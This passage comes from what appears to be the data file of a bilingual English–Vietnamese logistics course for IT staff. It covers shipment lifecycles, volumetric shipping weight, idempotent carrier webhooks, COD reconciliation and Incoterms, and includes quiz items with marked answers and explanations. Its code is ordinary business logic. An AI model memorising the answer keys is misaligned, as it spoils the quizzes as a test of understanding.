  OrderLineId BIGINT NOT NULL,
  Qty         INT NOT NULL
);`}},{type:"list",items:[`How many delivery attempts before we return the parcel?
VI: Giao thất bại bao nhiêu lần thì chuyển hoàn?`,`Who pays the return fee: the shop or the customer?
VI: Ai trả phí chuyển hoàn: shop hay khách?`,`Is the order done when the first box arrives, or the last?
VI: Đơn hoàn tất khi kiện đầu tiên đến, hay kiện cuối cùng?`,`Can the customer refuse only part of a parcel?
VI: Khách có được từ chối nhận một phần kiện hàng không?`]}],remember:`An order is what was bought; a shipment is the box that moves. Design the failure paths too.
VI: Đơn hàng là thứ khách mua; shipment là thùng hàng di chuyển. Hãy thiết kế cả các nhánh thất bại.`,questions:[{id:"logistics.lifecycle.1",kind:"scenario",difficulty:"easy",prompt:`An order has 3 items. Two ship today from warehouse A. One ships next week from warehouse B. How do you store this?
VI: Một đơn có 3 món. Hai món xuất hôm nay từ kho A, một món tuần sau từ kho B. Bạn lưu dữ liệu thế nào?`,choices:[`One shipment row on the order, with status PARTIAL
VI: Một dòng shipment cho đơn, trạng thái PARTIAL`,`Two shipments linked to the order, each with its items
VI: Hai shipment gắn với đơn, mỗi cái có danh sách món riêng`,`A comma list of tracking numbers on the order row
VI: Một chuỗi mã vận đơn cách nhau dấu phẩy trên đơn`,`Split it into two separate orders for the customer
VI: Tách thành hai đơn hàng riêng cho khách`],answer:1,why:`Each box has its own carrier, tracking number, items and status. A shipment table linked to the order keeps that clean. Splitting the order changes what the customer bought and breaks payment and invoice links.
VI: Mỗi kiện có hãng, mã vận đơn, danh sách món và trạng thái riêng. Bảng shipment gắn với đơn giữ dữ liệu rõ ràng. Tách đơn sẽ làm sai thứ khách đã mua và rối thanh toán, hóa đơn.`},{id:"logistics.lifecycle.2",kind:"code",difficulty:"medium",prompt:`Finance uses this function to count delivered parcels. What is wrong with it?
VI: Kế toán dùng hàm này để đếm số kiện đã giao. Hàm này sai ở đâu?`,code:{lang:"ts",text:`function isDelivered(s: Shipment) {
  return s.status !== 'PICKING'
      && s.status !== 'PACKED';
}`},choices:["It counts in-transit and returned parcels as delivered","It misses parcels that have the status DELIVERED","It throws an error when the status is null","Nothing is wrong; every parcel after packing counts"],answer:0,why:`The check says "not picking and not packed", so IN_TRANSIT, FAILED and RETURNED also pass. Check for the exact status you mean: \`s.status === 'DELIVERED'\`.
VI: Điều kiện là "không phải đang lấy hàng và không phải đã đóng gói", nên IN_TRANSIT, FAILED và RETURNED cũng lọt qua. Hãy so sánh đúng trạng thái cần: \`s.status === 'DELIVERED'\`.`,remember:"Test for the status you want, not for the ones you do not want."},{id:"logistics.lifecycle.3",kind:"truefalse",difficulty:"easy",prompt:`"Return to sender" means the customer got the parcel and sent it back because they did not like it.
VI: "Chuyển hoàn" nghĩa là khách đã nhận hàng rồi gửi trả lại vì không thích.`,choices:["True","False"],answer:1,why:`Return to sender is when the carrier could not deliver and brings the parcel back. A customer return after delivery is a different flow, with its own reasons, refund and checks.
VI: Chuyển hoàn là khi hãng không giao được và mang kiện về lại. Khách trả hàng sau khi đã nhận là một luồng khác, có lý do, hoàn tiền và kiểm tra riêng.`},{id:"logistics.lifecycle.4",kind:"scenario",difficulty:"medium",prompt:`A parcel failed delivery 3 times because nobody was home. The business rule is "max 3 attempts". What should the system do?
VI: Một kiện giao thất bại 3 lần vì không có ai ở nhà. Quy tắc là "tối đa 3 lần giao". Hệ thống nên làm gì?`,choices:[`Keep it in OUT_FOR_DELIVERY until someone checks it
VI: Giữ trạng thái đang giao cho đến khi có người kiểm tra`,`Move it to RETURNING and tell the customer and the shop
VI: Chuyển sang đang hoàn và báo cho khách và shop`,`Mark it DELIVERED so the order can be closed
VI: Đánh dấu đã giao để đóng đơn hàng`,`Delete the shipment and create a brand new one
VI: Xóa shipment và tạo một shipment mới`],answer:1,why:`The rule says no more attempts, so the parcel follows the return path. Faking DELIVERED makes revenue and stock wrong. Deleting loses the history you need for disputes.
VI: Quy tắc nói không giao thêm, nên kiện đi theo luồng chuyển hoàn. Ghi giả "đã giao" làm sai doanh thu và tồn kho. Xóa thì mất lịch sử cần cho khiếu nại.`}]},{id:"logistics.carriers",title:"Carriers, 3PL and shipping cost · Hãng vận chuyển, 3PL và cước phí",summary:`Who moves the box, and how the price is calculated.
VI: Ai chở hàng, và cước phí được tính thế nào.`,minutes:4,blocks:[{type:"text",text:`There are three common ways to move goods. You use your **own fleet** (your own trucks and drivers). You hire a **carrier**, like a courier company. Or you use a **3PL** (third-party logistics): an outside company that stores, packs and ships for you.
VI: Có ba cách phổ biến để chở hàng. Dùng **đội xe riêng** (xe và tài xế của mình). Thuê **hãng vận chuyển**, như công ty chuyển phát. Hoặc dùng **3PL** (logistics bên thứ ba): công ty ngoài lo lưu kho, đóng gói và giao hàng giúp bạn.`},{type:"diagram",text:`           Own fleet  Carrier   3PL
Store      you        you       3PL
Pack       you        you       3PL
Deliver    you        carrier   3PL or
                                its carrier
Control    high       medium    lower
Your data  yours      their API their API`},{type:"text",text:`Carriers price by weight. But a big, light box still takes space in the truck. So they also compute **volumetric weight** (trọng lượng quy đổi) from the box size. You pay for the bigger of the two: the **chargeable weight**.
VI: Hãng tính cước theo cân nặng. Nhưng thùng to mà nhẹ vẫn chiếm chỗ trên xe. Vì vậy hãng tính thêm **trọng lượng quy đổi** từ kích thước thùng. Bạn trả theo số lớn hơn: **khối lượng tính cước**.`},{type:"diagram",text:`Box 50 × 40 × 30 cm, actual weight 4 kg

Volume  = 50 × 40 × 30 = 60,000 cm³
Vol. wt = 60,000 / 5,000 = 12 kg
          (divisor 5,000: an example,
           it comes from the carrier)

Chargeable = max(actual, volumetric)
           = max(4, 12) = 12 kg`},{type:"text",text:`The divisor depends on the carrier and the service. Values like 5,000 or 6,000 are common, but read the contract. The final price comes from a rate table: weight band × **zone**. A zone is a distance group, for example same province, same region, or other region.
VI: Hệ số chia tùy theo hãng và loại dịch vụ. Các số như 5.000 hay 6.000 hay gặp, nhưng phải đọc hợp đồng. Giá cuối lấy từ bảng giá: mức cân nặng × **vùng**. Vùng là nhóm khoảng cách, ví dụ nội tỉnh, nội miền hoặc liên miền.`},{type:"code",code:{lang:"ts",text:`function chargeableKg(
  actualKg: number,
  l: number, w: number, h: number, // cm
  divisor: number, // from carrier contract
): number {
  const volKg = (l * w * h) / divisor;
  return Math.max(actualKg, volKg);
}
// Many carriers also round up to a step,
// for example 0.5 kg. Check the contract.`}},{type:"example",title:"The pillow shop",text:`A shop sells pillows. They are light but big. The checkout quotes shipping by actual weight. The carrier bills by volumetric weight. The shop loses money on every order and finds out at month end.
VI: Một shop bán gối. Gối nhẹ nhưng cồng kềnh. Trang thanh toán báo phí ship theo cân nặng thật. Hãng lại tính cước theo trọng lượng quy đổi. Shop lỗ trên mỗi đơn và đến cuối tháng mới phát hiện.`},{type:"text",text:`IT side: store box size and weight per package. Store the divisor and the rate table per carrier service. Keep both the fee you quoted and the fee the carrier billed, then compare them.
VI: Phía IT: lưu kích thước và cân nặng cho từng kiện. Lưu hệ số chia và bảng giá theo từng dịch vụ của hãng. Lưu cả phí đã báo khách và phí hãng tính, rồi đối chiếu hai số này.`}],remember:`Chargeable weight = max(actual, volumetric). The divisor comes from the carrier contract.
VI: Khối lượng tính cước = max(cân thật, quy đổi). Hệ số chia lấy từ hợp đồng với hãng.`,questions:[{id:"logistics.carriers.1",kind:"mcq",difficulty:"medium",prompt:`A box is 40 × 30 × 20 cm and weighs 3 kg. The carrier divisor is 6,000. What is the chargeable weight?
VI: Thùng 40 × 30 × 20 cm, nặng 3 kg. Hệ số chia của hãng là 6.000. Khối lượng tính cước là bao nhiêu?`,choices:["3 kg","4 kg","7 kg","24 kg"],answer:1,why:`40 × 30 × 20 = 24,000 cm³. Divided by 6,000 gives 4 kg. The bigger of 3 kg and 4 kg is 4 kg.
VI: 40 × 30 × 20 = 24.000 cm³. Chia 6.000 được 4 kg. Số lớn hơn giữa 3 kg và 4 kg là 4 kg.`},{id:"logistics.carriers.2",kind:"debug",difficulty:"medium",prompt:`For bulky products, the carrier invoice is often much higher than the fee your system quoted. Small heavy items match well. Most likely cause?
VI: Với hàng cồng kềnh, hóa đơn của hãng thường cao hơn nhiều so với phí hệ thống báo. Hàng nhỏ mà nặng thì khớp. Nguyên nhân khả năng cao nhất?`,choices:[`The carrier adds VAT only to bulky items
VI: Hãng chỉ cộng VAT cho hàng cồng kềnh`,`Your quote uses actual weight, not chargeable weight
VI: Hệ thống báo giá theo cân thật, không theo khối lượng tính cước`,`The zone table has the wrong province names
VI: Bảng vùng bị sai tên tỉnh`,`The carrier API returns prices in a different currency
VI: API của hãng trả giá theo loại tiền khác`],answer:1,why:`Only bulky items are wrong, so the problem is size, not distance or tax. Bulky items have a volumetric weight above their actual weight.
VI: Chỉ hàng cồng kềnh bị lệch, nên lỗi nằm ở kích thước, không phải khoảng cách hay thuế. Hàng cồng kềnh có trọng lượng quy đổi lớn hơn cân thật.`},{id:"logistics.carriers.3",kind:"compare",difficulty:"easy",prompt:`A small online shop sends about 20 parcels a day to all of Vietnam. Which option usually fits best?
VI: Một shop online nhỏ gửi khoảng 20 kiện mỗi ngày đi khắp Việt Nam. Phương án nào thường phù hợp nhất?`,choices:[`Buy trucks and hire drivers for every region
VI: Mua xe tải và thuê tài xế cho mọi miền`,`Use a carrier and pay per parcel
VI: Dùng hãng vận chuyển, trả tiền theo từng kiện`,`Open its own warehouse in each province
VI: Mở kho riêng ở mỗi tỉnh`],answer:1,why:`At 20 parcels a day, a nationwide own fleet or warehouses cost far more than the volume justifies. A carrier already covers the whole country and charges per parcel.
VI: Với 20 kiện mỗi ngày, tự có đội xe hay kho khắp nước thì quá tốn so với sản lượng. Hãng vận chuyển đã phủ toàn quốc và tính tiền theo từng kiện.`},{id:"logistics.carriers.4",kind:"truefalse",difficulty:"easy",prompt:`All carriers use the same volumetric divisor, so it is safe to hard-code 5,000 in the code.
VI: Mọi hãng đều dùng chung một hệ số chia, nên có thể ghi cứng số 5.000 trong code.`,choices:["True","False"],answer:1,why:`The divisor depends on the carrier and the service, and it can change in a new contract. Store it as data per carrier service.
VI: Hệ số chia tùy theo hãng và dịch vụ, và có thể đổi khi ký hợp đồng mới. Hãy lưu nó thành dữ liệu theo từng dịch vụ của hãng.`}]},{id:"logistics.tracking",title:"Tracking and status events · Theo dõi hành trình và sự kiện trạng thái",summary:`Carrier events arrive late, twice, or in the wrong order.
VI: Sự kiện từ hãng có thể đến trễ, đến hai lần, hoặc sai thứ tự.`,minutes:5,blocks:[{type:"text",text:`The carrier tells you where the parcel is. There are two ways. With a **webhook**, the carrier calls your URL when something happens. With **polling**, you call the carrier API every few minutes and ask.
VI: Hãng vận chuyển cho bạn biết kiện hàng đang ở đâu. Có hai cách. Với **webhook**, hãng gọi vào URL của bạn khi có sự kiện. Với **polling**, bạn gọi API của hãng vài phút một lần để hỏi.`},{type:"compare",left:{title:"Webhook",items:["Fast: news comes at once","Can arrive twice (retries)","Your endpoint must be up"]},right:{title:"Polling",items:["Simple to start","Slower: news waits for the next call","Many calls, rate limits"]}},{type:"text",text:"Events are messy. They can arrive late, twice, or out of order. Each event has the time it happened (`OccurredAt`). You also know when you received it (`ReceivedAt`).\nVI: Sự kiện không gọn gàng. Chúng có thể đến trễ, đến hai lần, hoặc sai thứ tự. Mỗi sự kiện có thời điểm xảy ra (`OccurredAt`). Bạn cũng biết thời điểm mình nhận được (`ReceivedAt`)."},{type:"diagram",text:`Happened (OccurredAt)      You receive
09:00 PICKED_UP       ──►  09:01
13:00 IN_TRANSIT      ──►  13:02
13:00 IN_TRANSIT      ──►  13:05 again
17:30 DELIVERED       ──►  17:31
15:00 OUT_FOR_DELIV.  ──►  17:40 late

"Last received wins" →
status goes back to OUT_FOR_DELIVERY`},{type:"text",text:"So the handler must be **idempotent**: handling the same event twice gives the same result as once. Use a unique key per event. Pick the current status by `OccurredAt`, not by arrival. Never leave a final status because of an old event.\nVI: Vì vậy phần xử lý phải **idempotent**: xử lý cùng một sự kiện hai lần cho kết quả như một lần. Dùng một khóa duy nhất cho mỗi sự kiện. Chọn trạng thái hiện tại theo `OccurredAt`, không theo lúc nhận. Đừng rời trạng thái cuối chỉ vì một sự kiện cũ."},{type:"code",code:{lang:"ts",text:`async function onEvent(e: CarrierEvent) {
  // 1. Seen before? Stop. (unique index
  //    on the event key makes this safe)
  const isNew = await events.tryInsert(e);
  if (!isNew) return;

  // 2. Carrier code → our status
  const st = statusMap[e.carrier]?.[e.code];
  if (!st) return alertUnknown(e);

  // 3. Never go back in time
  const s = await shipments.get(e.trackingNo);
  if (isFinal(s.status)) return;
  if (e.occurredAt <= s.lastEventAt) return;
  await shipments.update(s.id, st,
    e.occurredAt);
}`}},{type:"diagram",text:`Carrier code (example)   Our status
"PU", "Picked"       →   SHIPPED
"HUB_IN", "TRS"      →   IN_TRANSIT
"OFD"                →   OUT_FOR_DELIVERY
"DLV"                →   DELIVERED
"FD-01", "FD-02"     →   DELIVERY_FAILED
(unknown code)       →   alert, no guess`},{type:"example",title:"Two carriers, two languages",text:'A shop uses two carriers. One sends "DLV" for delivered. The other sends the number 5. Without a mapping table, the customer page shows raw codes. With a table `CarrierStatusMap`, both become DELIVERED.\nVI: Một shop dùng hai hãng. Hãng này gửi "DLV" khi giao xong. Hãng kia gửi số 5. Không có bảng ánh xạ, trang khách hàng hiện mã thô. Có bảng `CarrierStatusMap` thì cả hai đều thành DELIVERED.'}],remember:`Store every event, ignore duplicates, order by when it happened, and map carrier codes to your statuses.
VI: Lưu mọi sự kiện, bỏ qua bản trùng, sắp theo thời điểm xảy ra, và ánh xạ mã của hãng sang trạng thái của mình.`,questions:[{id:"logistics.tracking.1",kind:"debug",difficulty:"medium",prompt:`Customers say their order page showed "Delivered", then went back to "Out for delivery". What is the most likely cause?
VI: Khách phản ánh trang đơn hàng hiện "Đã giao", rồi quay lại "Đang giao". Nguyên nhân khả năng cao nhất?`,choices:[`A late event was applied because the code used arrival order
VI: Một sự kiện đến trễ được áp dụng vì code dùng thứ tự nhận`,`The carrier delivered the parcel to the wrong address
VI: Hãng giao nhầm địa chỉ`,`The browser cached an old version of the order page
VI: Trình duyệt lưu cache trang đơn hàng cũ`,`The database lost the DELIVERED row during a backup
VI: Cơ sở dữ liệu mất dòng DELIVERED khi sao lưu`],answer:0,why:'An old OUT_FOR_DELIVERY event arrived after DELIVERED, and "last received wins" applied it. Compare `OccurredAt` and never leave a final status.\nVI: Sự kiện "đang giao" cũ đến sau "đã giao", và logic "nhận sau thắng" đã áp dụng nó. Hãy so sánh `OccurredAt` và đừng rời trạng thái cuối.'},{id:"logistics.tracking.2",kind:"scenario",difficulty:"medium",prompt:`Your webhook endpoint was slow, so the carrier sent the same event 3 times. The customer got 3 "Your parcel is here" SMS. What fixes this?
VI: Endpoint webhook phản hồi chậm nên hãng gửi cùng một sự kiện 3 lần. Khách nhận 3 tin SMS "Hàng đã đến". Cách sửa là gì?`,choices:[`Ask the carrier to stop retrying failed webhooks
VI: Đề nghị hãng ngừng gửi lại webhook bị lỗi`,`Save the event key first; skip the SMS if it already exists
VI: Lưu khóa sự kiện trước; nếu đã có thì bỏ qua SMS`,`Send the SMS before saving, so it is always fast
VI: Gửi SMS trước rồi mới lưu, để luôn nhanh`,`Wait 10 seconds before sending each SMS
VI: Chờ 10 giây trước khi gửi mỗi tin SMS`],answer:1,why:`Retries are normal and protect you from lost events. Make the handler idempotent: a unique event key means a duplicate does nothing, including side effects like SMS.
VI: Gửi lại là chuyện bình thường và giúp không mất sự kiện. Hãy làm phần xử lý idempotent: có khóa sự kiện duy nhất thì bản trùng không làm gì, kể cả gửi SMS.`},{id:"logistics.tracking.3",kind:"mcq",difficulty:"easy",prompt:`What does "idempotent" mean for an event handler?
VI: "Idempotent" nghĩa là gì đối với phần xử lý sự kiện?`,choices:["It handles events faster than polling does","Handling an event twice gives the same result as once","It handles events in the order they were received","It rejects every event that has no tracking number"],answer:1,why:`Idempotent means repeating the action changes nothing after the first time. That is what you need when events can arrive twice.
VI: Idempotent nghĩa là làm lại thao tác không thay đổi gì sau lần đầu. Đó là điều cần khi sự kiện có thể đến hai lần.`},{id:"logistics.tracking.4",kind:"scenario",difficulty:"hard",prompt:`A carrier sends a status code "RTS-07" that is not in your mapping table. What is the best handling?
VI: Hãng gửi mã trạng thái "RTS-07" không có trong bảng ánh xạ. Cách xử lý tốt nhất là gì?`,choices:[`Map it to the closest known status by guessing
VI: Đoán và gán vào trạng thái gần giống nhất`,`Return HTTP 500 so the carrier keeps retrying
VI: Trả HTTP 500 để hãng cứ gửi lại`,`Store the raw event, keep the status, alert the team
VI: Lưu sự kiện thô, giữ trạng thái cũ, báo cho team`,`Show "RTS-07" to the customer as the status
VI: Hiện "RTS-07" cho khách làm trạng thái`],answer:2,why:`You keep the data and do not invent a meaning. Then ask the carrier or the business what the code means and add it to the table. A 500 makes the carrier retry an event you can never handle.
VI: Bạn giữ được dữ liệu và không tự bịa ý nghĩa. Sau đó hỏi hãng hoặc nghiệp vụ mã này nghĩa là gì rồi thêm vào bảng. Trả 500 khiến hãng gửi lại mãi một sự kiện bạn không xử lý được.`}]},{id:"logistics.last-mile",title:"Last-mile delivery · Giao hàng chặng cuối",summary:`Routes, delivery windows, proof of delivery and COD.
VI: Tuyến giao, khung giờ giao, bằng chứng giao hàng và thu hộ COD.`,minutes:5,blocks:[{type:"text",text:`The **last mile** is the trip from the local hub to the customer’s door. It is often the most costly part per parcel. It is also the least predictable part.
VI: **Chặng cuối** là đoạn từ bưu cục gần nhất đến tận cửa nhà khách. Đây thường là phần tốn kém nhất tính trên mỗi kiện. Nó cũng là phần khó đoán nhất.`},{type:"diagram",text:`HUB (bưu cục) 08:00 load the van
  │
  ├─► stop 1  09:10  OK    photo
  ├─► stop 2  09:40  FAIL  not home
  ├─► stop 3  10:05  OK    OTP
  ├─► stop 4  10:30  OK    COD 450,000
  │   ...
  └─► back to HUB 17:00
      with cash + failed parcels`},{type:"list",items:[`**Route planning**: put stops in a smart order to save time and fuel.
VI: **Lập tuyến**: sắp xếp điểm giao hợp lý để tiết kiệm thời gian và xăng.`,`**Delivery window**: the time range the customer expects, for example 9:00–12:00.
VI: **Khung giờ giao**: khoảng thời gian khách chờ nhận, ví dụ 9:00–12:00.`,`**Proof of delivery** (POD): a photo, a signature, or an OTP code.
VI: **Bằng chứng giao hàng** (POD): ảnh chụp, chữ ký, hoặc mã OTP.`,`**OTP**: a one-time code sent to the customer’s phone. The driver must enter it.
VI: **OTP**: mã dùng một lần gửi tới điện thoại khách. Tài xế phải nhập mã này.`]},{type:"text",text:`**COD** (cash on delivery, thu hộ) is very common in Vietnam. The driver collects cash from the customer. The carrier keeps the money, then transfers it to the shop later, minus fees.
VI: **COD** (thu hộ) rất phổ biến ở Việt Nam. Tài xế thu tiền mặt của khách. Hãng giữ tiền, sau đó chuyển cho shop, đã trừ phí.`},{type:"diagram",text:`Customer ─cash─► Driver ─► Carrier
                                │
            statement (bảng kê) │ transfer
            per tracking no     │ minus fees
                                ▼
                               Shop
Shop checks each parcel:
 expected COD = collected = paid out?`},{type:"example",title:"Three missing parcels",text:`A shop sends 2,000 COD parcels a week. The carrier transfers one lump sum with a file. The total matches the file. But 3 delivered parcels are not in the file at all. Only a per-parcel check finds them.
VI: Một shop gửi 2.000 kiện COD mỗi tuần. Hãng chuyển một khoản tổng kèm file bảng kê. Tổng tiền khớp với file. Nhưng có 3 kiện đã giao không hề có trong file. Chỉ đối soát từng kiện mới phát hiện được.`},{type:"code",code:{lang:"sql",text:`-- COD reconciliation (đối soát COD)
SELECT s.TrackingNo, s.CodAmount,
       c.CollectedAmount, c.FeeAmount
FROM Shipments s
LEFT JOIN CarrierCodLines c
  ON c.TrackingNo = s.TrackingNo
WHERE s.Status = 'DELIVERED'
  AND s.CodAmount > 0
  AND (c.TrackingNo IS NULL
    OR c.CollectedAmount <> s.CodAmount);`}},{type:"text",text:`Ask the business: can the customer open the parcel before paying? Who pays if the customer refuses? How often does the carrier pay out? What if the customer pays only part?
VI: Cần hỏi nghiệp vụ: khách có được mở hàng trước khi trả tiền không? Khách từ chối nhận thì ai chịu phí? Hãng chuyển tiền COD bao lâu một lần? Khách chỉ trả một phần thì sao?`}],remember:`COD money is with the carrier until it is paid out. Reconcile per tracking number, not only the total.
VI: Tiền COD nằm ở hãng cho đến khi hãng chuyển trả. Đối soát theo từng mã vận đơn, không chỉ so tổng.`,questions:[{id:"logistics.last-mile.1",kind:"compare",difficulty:"medium",prompt:`A customer says "I never got it", but the driver marked it delivered. Which proof best shows the right person received it?
VI: Khách nói "tôi chưa nhận", nhưng tài xế đã báo giao xong. Bằng chứng nào cho thấy rõ nhất là đúng người đã nhận?`,choices:[`The driver ticked "delivered" in the app
VI: Tài xế bấm "đã giao" trên app`,`An OTP sent to the customer’s phone and typed in
VI: Mã OTP gửi tới điện thoại khách và được nhập vào`,`The time stamp of the delivery event
VI: Mốc thời gian của sự kiện giao hàng`,`An SMS sent to the customer after delivery
VI: Tin SMS gửi cho khách sau khi giao`],answer:1,why:`Only the person with the customer’s phone can give the OTP. A tick or a time stamp only shows what the driver did. An SMS after delivery proves nothing about who received it.
VI: Chỉ người cầm điện thoại của khách mới đọc được mã OTP. Dấu tích hay mốc thời gian chỉ cho thấy tài xế đã làm gì. SMS gửi sau không chứng minh ai đã nhận.`},{id:"logistics.last-mile.2",kind:"debug",difficulty:"hard",prompt:`Each week, finance checks that the carrier transfer equals the total in the carrier’s COD file. It always matches. Yet the bank balance is short. Why?
VI: Mỗi tuần kế toán kiểm tra tiền hãng chuyển bằng tổng trong file COD của hãng. Luôn khớp. Nhưng tiền thực nhận vẫn thiếu. Vì sao?`,choices:[`The bank rounds each transfer down to the nearest thousand
VI: Ngân hàng làm tròn xuống mỗi khoản chuyển`,`Some delivered parcels are missing from the carrier’s file
VI: Một số kiện đã giao không có trong file của hãng`,`The carrier charges COD fees twice for every parcel
VI: Hãng tính phí COD hai lần cho mỗi kiện`],answer:1,why:`Comparing the transfer with the carrier’s own file only checks the carrier against itself. You must compare the file with your own list of delivered COD parcels.
VI: So tiền chuyển với file của chính hãng chỉ là hãng tự khớp với hãng. Phải so file đó với danh sách kiện COD đã giao trong hệ thống của mình.`,remember:"Reconcile against your own data, not the other side’s total."},{id:"logistics.last-mile.3",kind:"truefalse",difficulty:"easy",prompt:`When a COD parcel is marked delivered, the money is already in the shop’s bank account.
VI: Khi kiện COD được báo đã giao, tiền đã nằm trong tài khoản ngân hàng của shop.`,choices:["True","False"],answer:1,why:`The driver and then the carrier hold the cash. The shop gets it later, minus fees. So track "collected" and "paid out" as separate states.
VI: Tài xế rồi đến hãng giữ tiền mặt. Shop nhận sau, đã trừ phí. Vì vậy hãy theo dõi "đã thu" và "đã chuyển trả" là hai trạng thái riêng.`},{id:"logistics.last-mile.4",kind:"mcq",difficulty:"easy",prompt:`What is a "delivery window"?
VI: "Khung giờ giao" là gì?`,choices:["The time range when the customer expects the parcel","The window in the van where parcels are handed out","The number of days before an unpaid order is cancelled","The screen where the driver scans each parcel"],answer:0,why:`A delivery window is a promised time range, for example 9:00–12:00. Route planning must respect it.
VI: Khung giờ giao là khoảng thời gian đã hứa với khách, ví dụ 9:00–12:00. Lập tuyến phải tuân theo khung này.`}]},{id:"logistics.incoterms",title:"Import, export and Incoterms · Xuất nhập khẩu và Incoterms",summary:`Who pays for each part of the trip, and who takes the risk.
VI: Ai trả tiền từng chặng, và ai chịu rủi ro.`,minutes:5,blocks:[{type:"text",text:`**Incoterms** are standard trade terms published by the ICC. The current version is Incoterms 2020. Each term says who pays for each part of the trip. It also says where the **risk** moves from the seller to the buyer.
VI: **Incoterms** là các điều kiện thương mại chuẩn do ICC ban hành. Bản hiện hành là Incoterms 2020. Mỗi điều kiện quy định ai trả tiền cho từng chặng. Nó cũng quy định **rủi ro** chuyển từ người bán sang người mua ở đâu.`},{type:"diagram",text:`Seller ─► Port A ═ship═► Port B ─► Buyer
  ▲         ▲                        ▲
 EXW     FOB, CIF                   DDP
   risk moves to the buyer here

Term  Seller pays up to   Risk moves at
EXW   nothing, goods      seller’s door
      ready at the door
FOB   loading on ship     on board, A
CIF   freight + insur.    on board, A
      to Port B
DDP   everything, incl.   buyer’s door
      import duty`},{type:"text",text:`The classic trap is **CIF**. The seller pays freight and insurance to Port B. But the risk moves to the buyer at Port A, when the goods are on board. So the cost point and the risk point are different.
VI: Cái bẫy kinh điển là **CIF**. Người bán trả cước và bảo hiểm đến cảng B. Nhưng rủi ro chuyển sang người mua ngay tại cảng A, khi hàng đã lên tàu. Vậy điểm chịu chi phí và điểm chuyển rủi ro khác nhau.`},{type:"example",title:"Damaged at sea",text:`A Vietnamese company buys machine parts from Japan, CIF Hai Phong. A storm damages the goods at sea. The risk is already with the buyer. But the buyer can claim on the insurance the seller bought.
VI: Một công ty Việt Nam mua linh kiện máy từ Nhật, điều kiện CIF Hải Phòng. Bão làm hỏng hàng trên biển. Rủi ro lúc đó đã thuộc người mua. Nhưng người mua được đòi bồi thường từ bảo hiểm mà người bán đã mua.`},{type:"text",text:`Every import or export needs a **customs declaration** (tờ khai hải quan). In Vietnam it is filed electronically. Each product line needs an **HS code**: an international code for the type of goods. The first 6 digits are the same worldwide. Countries add more digits.
VI: Mọi lô hàng xuất nhập khẩu đều cần **tờ khai hải quan**. Ở Việt Nam, tờ khai được nộp điện tử. Mỗi dòng hàng cần **mã HS**: mã quốc tế phân loại hàng hóa. 6 số đầu giống nhau trên toàn thế giới. Mỗi nước thêm các số chi tiết hơn.`},{type:"text",text:`The HS code decides the duty rate. It can also decide which permits you need. **Lead time** is the total: production, inland transport, sea, customs clearance, and delivery. Plan with the total, not only the sea days.
VI: Mã HS quyết định thuế suất. Nó còn có thể quyết định cần giấy phép gì. **Lead time** là tổng thời gian: sản xuất, vận chuyển nội địa, đường biển, thông quan và giao hàng. Hãy lập kế hoạch theo tổng, không chỉ số ngày đi biển.`},{type:"list",items:[`On the PO/SO: Incoterm and the named place, for example "FOB Cat Lai".
VI: Trên PO/SO: điều kiện Incoterm và địa điểm, ví dụ "FOB Cát Lái".`,`On the product: HS code and country of origin.
VI: Trên sản phẩm: mã HS và xuất xứ.`,`On the shipment: declaration number, ETD and ETA (planned departure and arrival).
VI: Trên lô hàng: số tờ khai, ETD và ETA (ngày đi và ngày đến dự kiến).`,`Documents: commercial invoice, packing list, bill of lading (vận đơn), C/O.
VI: Chứng từ: hóa đơn thương mại, phiếu đóng gói, vận đơn, giấy chứng nhận xuất xứ (C/O).`]}],remember:`The Incoterm decides who pays and where the risk moves. With CIF, those two points are different.
VI: Điều kiện Incoterm quyết định ai trả tiền và rủi ro chuyển ở đâu. Với CIF, hai điểm đó khác nhau.`,questions:[{id:"logistics.incoterms.1",kind:"mcq",difficulty:"medium",prompt:`You buy goods **FOB** Shanghai. Who pays the main sea freight from Shanghai to Vietnam?
VI: Bạn mua hàng điều kiện **FOB** Thượng Hải. Ai trả cước biển chính từ Thượng Hải về Việt Nam?`,choices:["The seller","The buyer","The shipping line","Split 50/50"],answer:1,why:`Under FOB the seller pays until the goods are loaded on board at the named port. The buyer books and pays the main freight.
VI: Với FOB, người bán chịu phí đến khi hàng đã lên tàu tại cảng đi. Người mua thuê tàu và trả cước chặng chính.`},{id:"logistics.incoterms.2",kind:"scenario",difficulty:"hard",prompt:`You import under **CIF** Hai Phong. The goods are damaged at sea. Who carries the risk at that moment?
VI: Bạn nhập hàng điều kiện **CIF** Hải Phòng. Hàng bị hỏng trên biển. Lúc đó ai chịu rủi ro?`,choices:[`The seller, because the seller paid the freight
VI: Người bán, vì người bán đã trả cước`,`The buyer, but it can claim on the seller’s insurance
VI: Người mua, nhưng được đòi từ bảo hiểm người bán mua`,`The shipping line, in every case of sea damage
VI: Hãng tàu, trong mọi trường hợp hỏng trên biển`,`Nobody, until the goods clear customs in Vietnam
VI: Không ai, cho đến khi hàng thông quan ở Việt Nam`],answer:1,why:`Under CIF the risk moves when the goods are on board at the port of shipment. Paying the freight does not keep the risk with the seller. The insurance the seller bought is there to cover the buyer.
VI: Với CIF, rủi ro chuyển khi hàng đã lên tàu ở cảng đi. Trả cước không có nghĩa người bán còn chịu rủi ro. Bảo hiểm người bán mua là để bảo vệ người mua.`},{id:"logistics.incoterms.3",kind:"scenario",difficulty:"medium",prompt:`Your ERP stores only the unit price on purchase orders, not the Incoterm. What goes wrong first?
VI: ERP chỉ lưu đơn giá trên đơn mua hàng, không lưu Incoterm. Cái gì sai trước tiên?`,choices:[`Landed cost: you cannot tell if freight and duty are in the price
VI: Giá vốn nhập kho: không biết cước và thuế đã có trong giá chưa`,`HS code: customs cannot classify the product without the term
VI: Mã HS: hải quan không phân loại được hàng nếu thiếu điều kiện này`,`Supplier invoice: it can no longer be matched to the purchase order
VI: Hóa đơn nhà cung cấp: không còn đối chiếu được với đơn mua hàng`],answer:0,why:`An EXW price and a DDP price for the same goods are very different. Without the term you cannot tell which costs you still must add. So stock value and margin are wrong.
VI: Giá EXW và giá DDP cho cùng một hàng rất khác nhau. Không có điều kiện giao hàng thì không biết còn phải cộng chi phí nào. Vì vậy giá trị tồn kho và lợi nhuận bị sai.`},{id:"logistics.incoterms.4",kind:"truefalse",difficulty:"easy",prompt:`The HS code is chosen per supplier, so the same product can have a different HS code for each supplier.
VI: Mã HS được chọn theo nhà cung cấp, nên cùng một sản phẩm có thể có mã HS khác nhau cho mỗi nhà cung cấp.`,choices:["True","False"],answer:1,why:`The HS code classifies the goods themselves, not the supplier. Store it on the product. A wrong code can mean the wrong duty and problems with customs.
